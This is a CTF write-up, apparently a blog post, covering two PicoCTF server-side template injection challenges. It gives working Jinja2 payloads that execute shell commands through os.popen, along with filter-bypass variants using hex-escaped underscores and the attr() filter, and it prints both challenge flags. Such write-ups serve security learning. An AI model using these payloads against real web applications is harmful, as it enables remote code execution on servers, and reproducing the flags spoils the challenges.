This post will go through several CTFs on PicoCTF.

## <u>SSTI1
As the name suggests this CTF is about server side template injections. Using the image below we can figure out the template engine being used:

<img src="{{ site.url }}/assets/picoCtf/SSTI1.png" alt="ls command output" style="width: 500px; margin: auto; display: block;"/>

In this case we see it leads us to either Twig or Jinja2 but {{7*'7'}} outputs 7777777 in Jinja2 and 49 in Twig and since we get 7777777 this means it is using Jinja2. Now we can use this payload to check if there is any filters we need to bypass:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
But we get no errors and get the results "uid=0(root) gid=0(root) groups=0(root)" so this means we are fine and can begin executing our own commands, but first lets break down what this payload is actually doing. Since many flask applications import request we can use it as a gateway to reach deeper into python internals. Then using .__globals__.__builtins__ we are able to access everything in the modules global scope which includes __builtins__ which refers the builtin modules in python like os. After importing os then we use the popen function which executes the command specified by the string command and then we can read the output using the read function.


Now we can use this payload to find the flag first by using ls to see what files are available:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
We see there is a file called flag and using cat we can output the contents:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
And we get: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_df9a00a0}

## <u>SSTI2
This is a sequel to the last CTF but this time there is input sanitaztion. Again through testing we can find that the template engine is Jinja2 and through trial and error we find that it stops if there is '.' or '_'. Now we need to modify our previous payload to remove these characters, we can start with the '.' which we can remove through indexing instead like this:
```
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```
And then we can replace '_' with its unicode hex character '\x5f' as such:
```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

Now we can use the payload to find the flag like last time:
```
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}
```
But then this gets blocked again and then through trial and error I found that having "{{}}" and "['']" at the same time causes it to get caught. Now instead we can use |attr() which is a Jinja filter which fetches an attribute from an object which we can use instead of "[]".
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
```
After checking the files we find there is a file called flag which we can output.
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
And we get: picoCTF{sst1_f1lt3r_byp4ss_96a02202}
